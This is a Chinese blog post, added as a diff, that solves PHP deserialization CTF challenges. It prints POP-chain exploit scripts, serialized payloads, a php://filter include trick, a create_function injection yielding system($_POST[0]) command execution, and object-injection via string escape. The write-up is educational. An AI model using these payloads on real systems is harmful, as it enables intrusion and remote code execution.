@@ -1,0 +1,1382 @@
+<hr>
+<h2 id="title-反序列化题目练习date-2024-05-20categories-Web安全-注入漏洞-反序列化tags-反序列化-PHP-CTF题目"><a href="#title-反序列化题目练习date-2024-05-20categories-Web安全-注入漏洞-反序列化tags-反序列化-PHP-CTF题目" class="headerlink" title="title: 反序列化题目练习date: 2024-05-20categories:  - Web安全  - 注入漏洞  - 反序列化tags:  - 反序列化  - PHP  - CTF题目"></a>title: 反序列化题目练习<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - 注入漏洞<br>  - 反序列化<br>tags:<br>  - 反序列化<br>  - PHP<br>  - CTF题目</h2><h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h2><p><a href="http://122.114.252.87:1110/index2.php">http://122.114.252.87:1110/index2.php</a></p>
+<h4 id="解法1：-非预期解，手工调用"><a href="#解法1：-非预期解，手工调用" class="headerlink" title="解法1： 非预期解，手工调用"></a>解法1： 非预期解，手工调用</h4><p>第一步首先把网页上源代码复制下来 删除没用的 注释方法</p>
+<pre><code class="language-php">&lt;?php
+class Read 
+{
+    // public function get_file($value)
+    // {
+    //     $text = base64_encode(file_get_contents($value));
+    //     return $text;
+    // }
+}
+class Show
+{
+    public $source;
+    public $var;
+    public $class1;
+    // public function __construct($name=&#39;index.php&#39;)
+    // {
+    //     $this-&gt;source = $name;
+    //     echo $this-&gt;source.&#39; Welcome&#39;.&quot;&lt;br&gt;&quot;;    
+    // }
+    //关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容
+    public function __toString()
+    {   
+        $content = $this-&gt;class1-&gt;get_file($this-&gt;var);
+        //  因为get_file方法在Read中所有class1一定是Read的一个实例化对象
+        echo $content;
+        return $content;
+    }
+ 
+    // public function _show()
+    // {
+    //     if(preg_match(&#39;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#39;,$this-&gt;source)) {
+    //         die(&#39;hacker&#39;);
+    //     } else {
+    //         highlight_file($this-&gt;source);
+    //     }
+
+    // }
+ 
+    // public function Change()
+    // {
+    //     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+    //         echo &quot;hacker&quot;;
+    //     }
+    // }
+    // public function __get($key){
+    //     $function=$this-&gt;$key;
+    //     $this-&gt;{$key}();
+    // }
+}
+// if(isset($_GET[&#39;sid&#39;]))
+// {
+//     $sid=$_GET[&#39;sid&#39;];
+//     $config=unserialize($_GET[&#39;config&#39;]);
+//     $config-&gt;$sid;
+// }
+// else
+// {
+//     $show = new Show(&#39;index2.php&#39;);
+//     $show-&gt;_show();
+// }
+
+$s = new Show();
+$s -&gt; var = &#39;flag.php&#39;;
+
+$r = new Read();
+$s -&gt; class1 = $r;
+
+echo(urlencode(serialize($s)));
+</code></pre>
+<p>非预期可以直接通过参数sid手动调用__toString方法而不是使用魔术方法 注意调用时不要加括号</p>
+<p>输入</p>
+<pre><code class="language-php">http://122.114.252.87:1110/index2.php?config=O%3A4%3A%22Show%22%3A3%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A6%3A%22class1%22%3BO%3A4%3A%22Read%22%3A0%3A%7B%7D%7D&amp;sid=__toString
+</code></pre>
+<p>得到base64编码的字符串</p>
+<pre><code class="language-php">PD9waHAKJGZsYWcgPSAiZmxhZ3syNTZkN2ZkNi1kYjUxLTQ0YjktOGIyZC04OGUxN2IwODg2ZTl9IjsKPz4=
+</code></pre>
+<p>进行解密</p>
+<p><img src="/assets/17476536468948387717240924382119-20250519192047-ij0gmrz.png" alt="17476536468948387717240924382119"></p>
+<p>成功得到flag！</p>
+<h4 id="解法2：利用魔术方法调用-toString方法"><a href="#解法2：利用魔术方法调用-toString方法" class="headerlink" title="解法2：利用魔术方法调用__toString方法"></a>解法2：利用魔术方法调用__toString方法</h4><blockquote>
+<p>__toString() 		   &#x2F;&#x2F;把类当作字符串使用时触发</p>
+</blockquote>
+<p>在正则表达式中把类当做了字符串</p>
+<pre><code class="language-php">&lt;?php
+class Read 
+{
+    // public function get_file($value)
+    // {
+    //     $text = base64_encode(file_get_contents($value));
+    //     return $text;
+    // }
+}
+class Show
+{
+    public $source;
+    public $var;
+    public $class1;
+    // public function __construct($name=&#39;index.php&#39;)
+    // {
+    //     $this-&gt;source = $name;
+    //     echo $this-&gt;source.&#39; Welcome&#39;.&quot;&lt;br&gt;&quot;;    
+    // }
+    //关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容
+    public function __toString()
+    {   
+        $content = $this-&gt;class1-&gt;get_file($this-&gt;var);
+        //  因为get_file方法在Read中所有class1一定是Read的一个实例化对象
+        echo $content;
+        return $content;
+    }
+ 
+    // public function _show()
+    // {
+    //     if(preg_match(&#39;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#39;,$this-&gt;source)) {
+    //         die(&#39;hacker&#39;);
+    //     } else {
+    //         highlight_file($this-&gt;source);
+    //     }
+
+    // }
+ 
+    // public function Change()
+    // {
+    //     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
+    //         echo &quot;hacker&quot;;
+    //     }
+    // }
+    // public function __get($key){
+    //     $function=$this-&gt;$key;
+    //     $this-&gt;{$key}();
+    // }
+}
+// if(isset($_GET[&#39;sid&#39;]))
+// {
+//     $sid=$_GET[&#39;sid&#39;];
+//     $config=unserialize($_GET[&#39;config&#39;]);
+//     $config-&gt;$sid;
+// }
+// else
+// {
+//     $show = new Show(&#39;index2.php&#39;);
+//     $show-&gt;_show();
+// }
+
+//倒着写的 这个是终点
+$r = new Read();
+
+$s = new Show();
+$s -&gt; var = &#39;flag.php&#39;;
+$s -&gt; class1 = $r;
+
+$s2 = new Show();
+$s2 -&gt; source = $s;
+
+echo(urlencode(serialize($s2)));  //最后是对起点进行序列化
+</code></pre>
+<p>一定要注意好&#x3D;&#x3D;s和s2&#x3D;&#x3D;的区别，首先肯定是对s2进行序列化 然后sid中执行字符串匹配的方法，</p>
+<p>当通过&#x3D;&#x3D;s2去调用source&#x3D;&#x3D;的时候，因为source里面是&#x3D;&#x3D;类的对象&#x3D;&#x3D;，这个时候该&#x3D;&#x3D;对象也会执行&#x3D;&#x3D;，相当于去把&#x3D;&#x3D;s这个类对象&#x3D;&#x3D;，当做&#x3D;&#x3D;字符串去匹配正则表达式&#x3D;&#x3D;的时候，触发了&#x3D;&#x3D;s的toString方法&#x3D;&#x3D;，与&#x3D;&#x3D;s2没有关系，s2只是一个存放s的入口&#x3D;&#x3D;。</p>
+<p>此外当sid为&#x3D;&#x3D;_show&#x3D;&#x3D;的时候会出现&#x3D;&#x3D;两次加密字符串&#x3D;&#x3D;是因为触发了：</p>
+<pre><code class="language-php">else {
+     highlight_file($this-&gt;source);
+}
+</code></pre>
+<p>因为$this -&gt; source的结果就是编码字符串</p>
+<p>然后还有一进入正则表达式的方法时就调用了一次</p>
+<p>所以一共显示了两次</p>
+<p>解密后成功得到flag！</p>
+<hr>
+<h2 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h2><p><a href="http://122.114.252.87:1110/index3.php">http://122.114.252.87:1110/index3.php</a></p>
+<h6 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h6><pre><code class="language-php">index3.php You are in my range!
+&lt;?php
+error_reporting(0);
+class Vox{
+        protected $headset;
+        public $sound;
+    //考虑fun函数作为最终的利用点
+        public function fun($pulse){
+            //include！！！！危险函数 文件包含 通过文件流 伪协议 base64 读取flag.php文件
+                include($pulse);
+        }
+    //调用invoke魔术方法  对象作为函数时触发 找用小括号的地方
+        public function __invoke(){
+                //这里可以调用fun函数
+                $this-&gt;fun($this-&gt;headset);
+        }
+}
+
+class Saw{
+        public $fearless;
+        public $gun;
+        public function __construct($file=&#39;index.php&#39;){#创造对象时自动调用
+                $this-&gt;fearless = $file;
+                echo $this-&gt;fearless . &#39; You are in my range!&#39;.&quot;&lt;br&gt;&quot;;
+        }
+       //对象视为字符串触发 定位到正则匹配
+        public function __toString(){
+            //把gun设置为Petal的对象访问fearless 属于不存在属性
+            //需要注意的是gun设定为一个数组了 其中有一个键值为&#39;gun&#39; 所以给该键值进行相应赋值value gun = array(&quot;gun&quot; =&gt; $b)
+                $this-&gt;gun[&#39;gun&#39;]-&gt;fearless;
+                return &quot;Saw&quot;;
+        }
+		//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了
+        public function _pain(){
+                if($this-&gt;fearless){
+                        highlight_file($this-&gt;fearless);
+                }
+        }
+       //wakeup使用unserialize的时候自动触发
+        public function __wakeup(){
+               //正则匹配 把对象视为字符串 触发其toString方法
+                if(preg_match(&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;, $this-&gt;fearless)){
+                        echo &quot;Does it hurt? That&#39;s right&quot;;
+                        $this-&gt;fearless = &quot;index3.php&quot;;
+                }
+        }
+}
+
+class Petal{
+        public $seed;
+        public function __construct(){
+                $this-&gt;seed = array();
+        }
+        //寻找不可访问的属性 寻找箭头
+        public function __get($sun){
+                
+            $Nourishment = $this-&gt;seed;
+            //函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke 
+                return $Nourishment();
+        }
+}
+
+if(isset($_GET[&#39;ozo&#39;])){
+        unserialize($_GET[&#39;ozo&#39;]);   //只有反序列化一定是自动触发的过程
+}
+else{
+        $Saw = new Saw(&#39;index3.php&#39;);
+        $Saw-&gt;_pain();
+}
+?&gt;
+</code></pre>
+<h6 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h6><p>起始位置：先考虑魔术方法，destruct或者wakeup 现在题目中只能去利用wakeup作为起始。</p>
+<p>结束位置：利用危险的函数，比如include，highlight_file去进行文件内容的读取</p>
+<p>知识点补充：</p>
+<ol>
+<li>遇到正则匹配不要慌，那正是toString方法自动调用的入口</li>
+<li>如果需要触发的魔术方法在一个方法中，那么就new两个对象交互使用</li>
+<li>include文件包含读取php文件内容常用模板 文件流伪协议base64 即：</li>
+</ol>
+<pre><code class="language-php">php://filter/convert.base64-encode/resource=flag.php
+</code></pre>
+<ol start="4">
+<li>private的赋值直接在内部，在外面可能赋值不成功</li>
+</ol>
+<p>构建exp的顺序是从结尾往起始写的，逆向思维，就是我达成这个目的需要什么事情作为前提就是思考的过程，所以最终<a href="https://so.csdn.net/so/search?q=serialize&spm=1001.2101.3001.7020">serialize</a>的是exp的最后值</p>
+<p>解题过程：</p>
+<ol>
+<li><p>首先需要找到最后的危险函数，看到了在Vox里面的include。</p>
+</li>
+<li><p>然后想要使用include就要调用fun这个函数</p>
+</li>
+<li><p>想要调用fun就要触发__invoke这个魔术方法</p>
+</li>
+<li><p>作为函数就是添加了一个小括号去触发，发现在Petal类中__get方法具备这个调用函数的功能，所以需要去触发__get这个方法</p>
+</li>
+</ol>
+<pre><code class="language-php">__invoke()          //当脚本尝试将对象调用为函数时触发
+__get() 		    //用于从不可访问的属性读取数据   包括属性不可访问和不存在
+</code></pre>
+<ol start="5">
+<li>因为与访问相关，所以全局搜索-&gt;去找哪里会访问，可以发现在Saw类中的__toString中有一个利用数组特性去访问fearless的过程，这个fearless属于上面的get方法中不存在的属性，为不可访问属性，会触发__get,所以需要去触发__toString这个魔术方法</li>
+</ol>
+<pre><code class="language-php">__toString() 		    //把类当作字符串使用时触发
+</code></pre>
+<ol start="6">
+<li>这就需要去利用正则表达式，视为字符串的特性去触发这个toString方法，而正则表达式在wakeup魔术方法里面</li>
+</ol>
+<pre><code class="language-php">__wakeup() 		    //使用unserialize时触发
+</code></pre>
+<ol start="7">
+<li>所以直接在反序列化的时候就会触发这个wakeup魔术方法，到此整个pop链的逻辑全部理清</li>
+</ol>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a><strong>exp：</strong></h5><pre><code class="language-php">$v = new Vox;
+//headset的赋值在内部直接赋值为php://filter/convert.base64-encode/resource=flag.php
+
+$p = new Petal;
+$p -&gt; seed = $v;   //把$v这个对象作为函数  触发这个对象的invoke方法
+
+$s = new Saw;
+$s -&gt; gun = array(&quot;gun&quot; =&gt; $p);    //让$p这个对象去访问fearless 不存在触发这个对象中的get方法
+$s2 = new Saw;
+$s2 -&gt; fearless = $s;       //把$s这个对象作为字符串 触发这个对象中的toString方法
+
+echo urlencode(serialize($s2));   //输出最终结果
+</code></pre>
+<h5 id="自己写的exp："><a href="#自己写的exp：" class="headerlink" title="自己写的exp："></a>自己写的exp：</h5><pre><code class="language-php">index3.php You are in my range!
+&lt;?php
+error_reporting(0);
+class Vox{
+        protected $headset = &#39;php://filter/convert.base64-encode/resource=flag.php&#39;;
+        public $sound;
+    //考虑fun函数作为最终的利用点
+        public function fun($pulse){
+                include($pulse);
+        }
+    //调用invoke魔术方法  对象作为函数时触发 找用小括号的地方
+        public function __invoke(){
+                //这里可以调用fun函数
+                $this-&gt;fun($this-&gt;headset);
+        }
+}
+
+class Saw{
+        public $fearless;
+        public $gun;
+        public function __construct($file=&#39;index.php&#39;){
+                $this-&gt;fearless = $file;
+                echo $this-&gt;fearless . &#39; You are in my range!&#39;.&quot;&lt;br&gt;&quot;;
+        }
+       //对象视为字符串触发 定位到正则匹配
+        public function __toString(){
+            //把gun设置为Petal的对象访问fearless 属于不存在属性
+                $this-&gt;gun[&#39;gun&#39;]-&gt;fearless;
+                return &quot;Saw&quot;;
+        }
+		//只是一个普通的方法 因为只有一个下划线  发现根本调用不了直接排除就好了
+        public function _pain(){
+                if($this-&gt;fearless){
+                        highlight_file($this-&gt;fearless);
+                }
+        }
+       //wakeup使用unserialize的时候自动触发
+        public function __wakeup(){
+               //正则匹配 把对象视为字符串 触发其toString方法
+                if(preg_match(&quot;/gopher|http|file|ftp|https|dict|php|\.\./i&quot;, $this-&gt;fearless)){
+                        echo &quot;Does it hurt? That&#39;s right&quot;;
+                        $this-&gt;fearless = &quot;index3.php&quot;;
+                }
+        }
+}
+
+class Petal{
+        public $seed;
+        public function __construct(){
+                $this-&gt;seed = array();
+        }
+        //寻找不可访问的属性 寻找箭头
+        public function __get($sun){
+                
+            $Nourishment = $this-&gt;seed;
+            //函数的调用后面有括号  可以把类的对象作为函数调用 触发invoke 
+                return $Nourishment();
+        }
+}
+
+// if(isset($_GET[&#39;ozo&#39;])){
+//         unserialize($_GET[&#39;ozo&#39;]);   //只有反序列化一定是自动触发的过程
+// }
+// else{
+//         $Saw = new Saw(&#39;index3.php&#39;);
+//         $Saw-&gt;_pain();
+// }
+
+$a = new Saw();
+
+$a2 = new Saw();
+
+$a -&gt; fearless = $a2;
+
+$b = new Petal;
+$a2 -&gt; gun = array(&quot;gun&quot; =&gt; $b);
+$c = new Vox;
+$b -&gt; seed = $c;
+
+echo urlencode(serialize($a));
+?&gt;
+</code></pre>
+<p>输入后成功得到一段base64密文</p>
+<p><img src="/assets/17476562901048388660158913969350-20250519200450-p2hilyc.png" alt="17476562901048388660158913969350"></p>
+<p>解密成功得到flag！</p>
+<p>‍</p>
+<h2 id="例题3："><a href="#例题3：" class="headerlink" title="例题3："></a>例题3：</h2><p><a href="http://122.114.252.87:1110/gwb.php">http://122.114.252.87:1110/gwb.php</a></p>
+<h6 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h6><pre><code class="language-php">&lt;?php
+class A{
+    public function f(){
+        echo &quot;i am f() from class A&quot;;
+    }
+}
+$arr = [new A, &#39;f&#39;];
+$arr();
+</code></pre>
+<p>运行结果：<strong>i am f() from class A</strong></p>
+<p>表明当一个数组被当做函数触发时，数组第一个元素是对象，第二个元素是方法的名字（字符串），那么就会调用该对象下的该方法。即可以调用任意对象的任意方法</p>
+<p>题目源码：</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$pwd=getcwd();
+class func
+{
+        public $mod1;
+        public $mod2;
+         public $key;
+    //起始位置
+        public function __destruct()
+        {        
+            //后面有括号 函数调用 考虑使用数组的特性
+                unserialize($this-&gt;key)();
+                $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1;
+                  
+        } 
+}
+
+class GetFlag
+{        public $code;
+         public $action;
+        public function get_flag(){
+            //利用这段代码进行creat_function方法的调用
+            $a=$this-&gt;action;
+            $a(&#39;&#39;, $this-&gt;code);
+        }
+}
+unserialize($_GET[0]);
+?&gt;
+</code></pre>
+<h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$pwd=getcwd();
+class func
+{
+        public $mod1;
+        public $mod2;
+         public $key;
+        public function __destruct()
+        {        
+                // unserialize($this-&gt;key)();
+                // $this-&gt;mod2 = &quot;welcome &quot;.$this-&gt;mod1;
+                  
+        } 
+}
+
+class GetFlag
+{        
+        public $code = &#39;return(0);}echo(123);system($_POST[0]);//&#39;;
+         public $action = &quot;create_function&quot;;
+        public function get_flag(){
+            // $a=$this-&gt;action;
+            // $a(&#39;&#39;, $this-&gt;code);
+            //相当于创建了一个名为a的函数 无参 函数内容如下
+            function a(){
+                return(0);}echo(123);system($_POST[0]);//}
+            //提前把函数a进行闭合 然后后面多余的括号注释掉
+}
+
+$a = new func();
+$arr = [new GetFlag, &#39;get_flag&#39;];
+$a -&gt; key = serialize($arr);
+// unserialize($_GET[0]);
+echo urlencode(serialize($a));
+
+?&gt;
+</code></pre>
+<p>传上去之后当我们看到echo的123证明成功执行了这个create_function函数 然后通过system危险函数只需要post参数值就可以进行任意命令执行</p>
+<pre><code class="language-php">0=cat \flag.php
+</code></pre>
+<p><img src="/assets/17476563861268689087422098348706-20250519200627-pcvbx9z.png" alt="17476563861268689087422098348706"></p>
+<p>成功获取flag 查看一下源代码即可</p>
+<p><img src="/assets/17476564501344612018797667358221-20250519200730-fs681v3.png" alt="17476564501344612018797667358221"></p>
+<p>‍</p>
+<h1 id="指针问题："><a href="#指针问题：" class="headerlink" title="指针问题："></a>指针问题：</h1><p>对于一些系统中生成的随机值进行绕过的方法 用C语言中的取地址符&amp;进行指针引用，在序列化的时候类型为R</p>
+<h2 id="例题1：BUU-CODE-REVIEW-1-BUUOJ"><a href="#例题1：BUU-CODE-REVIEW-1-BUUOJ" class="headerlink" title="例题1：BUU CODE REVIEW 1 BUUOJ"></a>例题1：BUU CODE REVIEW 1 BUUOJ</h2><h5 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h5><pre><code class="language-php"> &lt;?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/10/6
+ * Time: 8:04 PM
+ */
+
+highlight_file(__FILE__);
+
+class BUU {
+   public $correct = &quot;&quot;;
+   public $input = &quot;&quot;;
+
+   public function __destruct() {
+       try {
+           $this-&gt;correct = base64_encode(uniqid());
+           if($this-&gt;correct === $this-&gt;input) {
+               echo file_get_contents(&quot;/flag&quot;);
+           }
+       } catch (Exception $e) {
+       }
+   }
+}
+
+if($_GET[&#39;pleaseget&#39;] === &#39;1&#39;) {
+    if($_POST[&#39;pleasepost&#39;] === &#39;2&#39;) {
+        if(md5($_POST[&#39;md51&#39;]) == md5($_POST[&#39;md52&#39;]) &amp;&amp; $_POST[&#39;md51&#39;] != $_POST[&#39;md52&#39;]) {
+            unserialize($_POST[&#39;obj&#39;]);
+        }
+    }
+}
+</code></pre>
+<p>传入时存在一个弱类型的比较 用数组即可绕过</p>
+<p>在BUU类中存在一个uniqid()函数 以微秒级生成标识 每时每刻都在改变，所以我们没办法确定input的值传入 而是通过指针的方法调用correct的值进行绕过</p>
+<pre><code class="language-php">&lt;?php
+
+class BUU {
+   public $correct = &quot;&quot;;
+   public $input = &quot;&quot;;
+
+//    public function __destruct() {
+//        try {
+//            $this-&gt;correct = base64_encode(uniqid());
+//            if($this-&gt;correct === $this-&gt;input) {
+//                echo file_get_contents(&quot;/flag&quot;);
+//            }
+//        } catch (Exception $e) {
+//        }
+//    }
+}
+
+$a = new BUU;
+$a -&gt; input = &amp;$a -&gt; correct;
+echo serialize($a);
+</code></pre>
+<p>生成payload：</p>
+<pre><code class="language-php">O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}
+</code></pre>
+<p><img src="/assets/17476565097171150640440786115888-20250519200830-rrjxtqt.png" alt="17476565097171150640440786115888"></p>
+<h2 id="例题2：2020蓝帽杯"><a href="#例题2：2020蓝帽杯" class="headerlink" title="例题2：2020蓝帽杯"></a>例题2：2020蓝帽杯</h2><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><pre><code class="language-php">&lt;?php
+class Seri{
+    public $alize;
+    // public function __construct($alize) {
+    //     $this-&gt;alize = $alize;
+    // }
+    public function __destruct(){
+        $this-&gt;alize-&gt;getFlag();
+    }
+}
+
+class Flag{
+    public $f;
+    public $t1;
+    public $t2;
+
+    function __construct($file){
+        echo &quot;Another construction!!&quot;;
+        $this-&gt;f = $file;
+        $this-&gt;t1 = $this-&gt;t2 = md5(rand(1,10000));
+    }
+
+    public function getFlag(){
+        $this-&gt;t2 = md5(rand(1,10000));
+        echo $this-&gt;t1;
+        echo $this-&gt;t2;
+        if($this-&gt;t1 === $this-&gt;t2)
+        {
+            if(isset($this-&gt;f)){
+                echo @highlight_file($this-&gt;f,true);
+                echo &#39;niubi&#39;;
+            }
+        } else {
+            echo &quot;no&quot;;
+        }
+    }
+    
+}
+$p = $_GET[&#39;p&#39;];
+if (isset($p)) {
+    $p = unserialize($p);
+} else {
+    show_source(__FILE__);
+    // echo &quot;NONONO&quot;;
+}
+
+// $a = new Seri;
+// $b = new Flag;  注意使用该语句生成payload的时候要把本地的方法禁用
+// $a -&gt; alize = $b;
+// $b -&gt; t1 = &amp;$b -&gt; t2; 
+// $b -&gt; f = &#39;flag.php&#39;;
+// echo serialize($a);
+</code></pre>
+<p><img src="/assets/17476565317604900775680869431296-20250519200852-08dr7rx.png" alt="17476565317604900775680869431296"></p>
+<p>但是本道题因为是rand函数 随机生成的范围有限</p>
+<p>所以可以随意设置一个范围内的数字 然后通过bp进行爆破</p>
+<hr>
+<h1 id="畸形序列化字符串"><a href="#畸形序列化字符串" class="headerlink" title="畸形序列化字符串"></a>畸形序列化字符串</h1><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol>
+<li>绕过__wakeup（）</li>
+<li>fast destruct快速析构</li>
+</ol>
+<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h5><p>在老版本的php中对序列化的结果的对象属性值+n</p>
+<h5 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h5><p>类需要利用析构方法进行某种操作（帮助你去拿flag），但是在析构之前会调用一些方法进行过滤或干扰，常见的出题形式：</p>
+<pre><code class="language-php">&lt;?php
+$obj = unserialize($_GET[&#39;exp&#39;]);
+$obj -&gt; safe_filter();    //调用一个进行安全检查的方法
+</code></pre>
+<p><strong>快速析构的原理：</strong></p>
+<p>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；</p>
+<p>但是由于给的是一个畸形的反序列化字符串，是不标准的，php对这个畸形序列化字符串得到的<strong>对象</strong>不放心，会赶紧把该<strong>对象</strong>清除掉，就会触发其析构方法。</p>
+<p>这样就会提前触发析构方法，不需要等到所用语句都执行结束，也就可以避免一些安全检查方法的调用。</p>
+<hr>
+<h1 id="0708反序列化字符逃逸"><a href="#0708反序列化字符逃逸" class="headerlink" title="0708反序列化字符逃逸"></a>0708反序列化字符逃逸</h1><h3 id="开篇例题："><a href="#开篇例题：" class="headerlink" title="开篇例题："></a>开篇例题：</h3><h4 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h4><p><a href="http://122.114.252.87:2030/">http://122.114.252.87:2030/</a></p>
+<pre><code class="language-php"> &lt;?php
+show_source(&quot;index.php&quot;);
+//函数作用：把0*0 替换为\0\0\0  因为后面这个内容是在单引号里面包裹 所以斜杠就是斜杠  但是如果在双引号里面包裹就会变成转义字符
+function write($data) {
+    //关键所在这里的替换字符数不等长  3到6字符的替换
+    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
+}
+
+function read($data) {
+    //6到3字符的替换
+    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
+}
+
+class A{
+    public $username;
+    public $password;
+    function __construct($a, $b){
+        $this-&gt;username = $a;
+        $this-&gt;password = $b;
+    }
+}
+
+class B{
+    public $b = &#39;world&#39;;
+    function __destruct(){
+        $c = &#39;hello&#39;.$this-&gt;b;
+        echo $c;
+    }
+}
+
+class C{
+    public $c;
+    function __toString(){
+        //flag.php
+        echo file_get_contents($this-&gt;c);
+        return &#39;nice&#39;;
+    }
+}
+
+$a = new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);
+//关于read和write函数 如果可以保证外层替换的字符串存在  内层的不存在  就可以只触发外层函数
+$b = unserialize(read(write(serialize($a)))); 
+</code></pre>
+<p>对于双引号和单引号的测试如下</p>
+<pre><code class="language-php">php -a   //直接在cmd中输入 会启动php
+
+php &gt; echo &#39;\n&#39;;
+\n               //单引号是什么就输出什么
+php &gt; echo &quot;\n&quot;;
+                //转义后只有换行
+php &gt;
+</code></pre>
+<p>类比sql注入中的逃逸</p>
+<pre><code class="language-php">select * from users where u=&#39;&#39; and p=&#39;&#39;
+//进行逃逸
+select * from users where u=&#39;\&#39; and p=&#39; or 1=1&#39;  //单引号会被转义掉
+=&gt; select * from users where u=&#39; and p=&#39; or 1=1&#39;
+</code></pre>
+<h4 id="本质："><a href="#本质：" class="headerlink" title="本质："></a>本质：</h4><p>对序列化字符串进行不等长的字符串替换，导致本来属于普通字符串的一部分字符串变成了序列化的一部分，或者导致本来不属于字符串的一部分变成了字符串的一部分，进而造成了序列化数据的错乱，导致了对象注入。</p>
+<h4 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h4><p>获取A的序列化</p>
+<pre><code class="language-php">&lt;?php
+class A{
+    public $username=&quot;UN&quot;;
+    public $password=&quot;PW&quot;;
+    
+}
+
+echo serialize(new A)
+
+?&gt;
+</code></pre>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;UN&quot;;s:8:&quot;password&quot;;s:2:&quot;PW&quot;;}
+</code></pre>
+<p>获取BC的序列化</p>
+<pre><code class="language-php">&lt;?php
+class B{
+    public $b = &#39;world&#39;;
+    // function __destruct(){
+    //      字符串的拼接触发toString 
+    //      $c = &#39;hello&#39;.$this-&gt;b;
+    //     //echo类的对象会触发toString方法
+    //     echo $c;
+    // }
+}
+
+class C{
+    public $c = &quot;flag.php&quot;;
+    // function __toString(){
+    //     //flag.php
+    //     echo file_get_contents($this-&gt;c);
+    //     return &#39;nice&#39;;
+    // }
+}
+
+$b = new B;
+$c = new C;
+$b -&gt; b = $c;
+echo serialize($b)
+
+?&gt;
+</code></pre>
+<pre><code class="language-php">O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}
+</code></pre>
+<p>接下来需要把BC读取flag的序列化结果填入到A中</p>
+<p>首先对于序列化的属性进行讲解：</p>
+<pre><code class="language-php">a:3:{i:0;s:6:&quot;张三&quot;;i:1;s:6:&quot;李四&quot;;i:2;i:18;}
+</code></pre>
+<p>简单说明下序列化字符串</p>
+<p>a:3 ——&gt; 代表集合中有3个元素，a则是array类型（o则是object，s则是string，i则是integer等等）</p>
+<p>i:0;s:6:”张三” ——&gt; i:0则是第一个元素，s:6则是string，字符串长度为6，元素是张三</p>
+<p>i:2;i:18 ——&gt; i:2则是第三个元素，i:18则是int，整数不计算长度，元素是18</p>
+<blockquote>
+<p>a – array<br>b – boolean<br>d – double<br>i – integer<br>o – common object<br>r – reference<br>s – string<br>C – custom object<br>O – class<br>N – null<br>R – pointer reference<br>U – unicode string<br>N 表示的是 NULL</p>
+</blockquote>
+<p>所以把我们生成的两个序列化放到一起研究如何利用：</p>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:2:&quot;UN&quot;;s:8:&quot;password&quot;;s:2:&quot;PW&quot;;}
+object 一个 为A类 中有两个成员 
+    第一个是string型 长度为8 名为username 其值为string型长度为2 值为UN 
+    第二个是string型 长度为8 名为password 其值为string型长度为2 值为PW
+</code></pre>
+<pre><code class="language-php">O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}
+object 一个 为B类 中有一个成员
+    第一个为string型 长度为1 名为b 
+    其值为object型 一个 值为C 其中包含一个成员 string型 名为c 其值为string型长度为8 值为flag.php
+</code></pre>
+<p>拼接：BC 填入到 A中 因为函数执行的是A的对象 把PW给删了 分号结尾</p>
+<pre><code class="language-php">O:1:&quot;A&quot;:2:{属性s:8:&quot;username&quot;;属性的值s:2:&quot;UN&quot;;s:8:&quot;password&quot;;s:2:&quot; 补一个分号结尾;这些全部吃掉 把password约束吃掉的结果 作为username的值  这里缺少属性 补一个 属性s:8:&quot;password&quot;;属性的值（object型）O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}} 这里的两个符号&quot;;也多余了 补充保证格式正确s:0:&quot;&quot;;s:0&quot;&quot;; }
+</code></pre>
